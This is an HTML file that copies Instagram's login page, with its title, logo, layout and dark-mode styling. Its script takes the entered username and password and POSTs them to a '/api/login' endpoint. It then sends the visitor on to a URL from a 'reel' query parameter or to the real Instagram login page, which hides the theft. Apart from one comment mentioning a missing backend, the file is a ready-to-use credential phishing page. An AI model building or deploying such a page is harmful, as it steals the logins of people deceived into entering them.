<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        :root {
            --bg-color: #fafafa;
            --box-bg: #ffffff;
            --border-color: #dbdbdb;
            --text-primary: #262626;
            --text-secondary: #8e8e8e;
            --link-color: #00376b;
            --input-bg: #fafafa;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --box-bg: #000000;
                --border-color: #262626;
                --text-primary: #f5f5f5;
                --text-secondary: #a8a8a8;
                --link-color: #e0f1ff;
                --input-bg: #121212;
            }
            /* This turns the black logo white in dark mode */
            .logo { filter: invert(1); }
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body { 
            background-color: var(--bg-color); 
            color: var(--text-primary);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            flex-direction: column; 
            transition: background 0.3s ease;
        }
        
        .container { width: 350px; display: flex; flex-direction: column; gap: 10px; }

        .box { 
            background: var(--box-bg); 
            border: 1px solid var(--border-color); 
            padding: 10px 40px; 
            text-align: center; 
        }
        
        .logo { width: 175px; margin: 36px 0 12px; display: inline-block; }

        form { display: flex; flex-direction: column; margin-top: 24px; }
        
        input { 
            width: 100%; height: 38px; 
            background: var(--input-bg); 
            border: 1px solid var(--border-color); 
            color: var(--text-primary);
            border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; 
        }

        button { 
            width: 100%; background: #0095f6; color: white; border: none; 
            border-radius: 8px; height: 32px; font-weight: 600; cursor: pointer; margin: 8px 0; 
        }
        
        .forgot-link { margin: 12px 0; font-size: 12px; color: var(--link-color); text-decoration: none; display: block; }
        .signup-text { font-size: 14px; margin: 15px 0; color: var(--text-primary); }
        .signup-text span { color: #0095f6; font-weight: 600; cursor: pointer; }
        .get-app { text-align: center; margin-top: 20px; font-size: 14px; color: var(--text-primary); }
        .store-imgs { display: flex; justify-content: center; gap: 8px; margin-top: 20px; }
        .store-imgs img { height: 40px; }
    </style>
</head>
<body>

<div class="container">
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <a href="#" class="forgot-link">Forgot password?</a>
    </div>

    <div class="box">
        <p class="signup-text">Don't have an account? <span>Sign up</span></p>
    </div>

    <div class="get-app">
        <p>Get the app.</p>
        <div class="store-imgs">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            <img src="https://get.microsoft.com/images/en-us%20dark.svg" alt="Get it from Microsoft">
        </div>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        try {
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });
        } catch (err) { console.error("Data sent locally (expected error if no backend):", {user, pass}); }

        const params = new URLSearchParams(window.location.search);
        const nextLink = params.get('reel');
        window.location.href = nextLink || "https://www.instagram.com/accounts/login/";
    });
</script>

</body>
</html>
